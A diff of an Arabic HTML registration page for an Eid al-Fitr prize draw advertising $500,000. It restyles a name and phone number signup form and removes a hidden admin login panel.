@@ -2,25 +2,30 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>سحب عيد الفطر المليون</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سحب عيد الفطر المليون | سجل الآن</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="container">
-        <img src="logo.jpg" alt="Logo" class="logo">
-        <h1>سجل الآن في سحب الـ $500,000</h1>
-        <form id="regForm">
-            <input type="text" id="userName" placeholder="الاسم الكامل" required>
-            <input type="tel" id="userPhone" placeholder="رقم الهاتف" required>
-            <button type="submit" class="btn-gold">دخول السحب</button>
-        </form>
+    <div class="hero-section">
+        <div class="overlay"></div>
+        <div class="content-box">
+            <img src="logo.png" alt="شعار المليون" class="main-logo">
+            <h1 class="gold-text">برنامج العيد السنوي للسحب</h1>
+            <p class="sub-text">سجل الآن لفرصة ربح <span class="prize">$500,000</span></p>
+            
+            <form id="registrationForm" class="glass-form">
+                <div class="input-group">
+                    <input type="text" id="fullName" placeholder="الاسم الكامل" required>
+                </div>
+                <div class="input-group">
+                    <input type="tel" id="phoneNumber" placeholder="رقم الهاتف" required>
+                </div>
+                <button type="submit" id="submitBtn" class="draw-btn">انضم للسحب الآن</button>
+            </form>
+            <div id="responseMsg"></div>
+        </div>
     </div>
-
-    <div id="adminPanel" class="hidden">
-        <input type="password" id="adminPass" placeholder="الكود السري">
-        <button onclick="checkAdmin()">دخول المسؤول</button>
-    </div>
-
     <script src="script.js"></script>
 </body>
 </html>
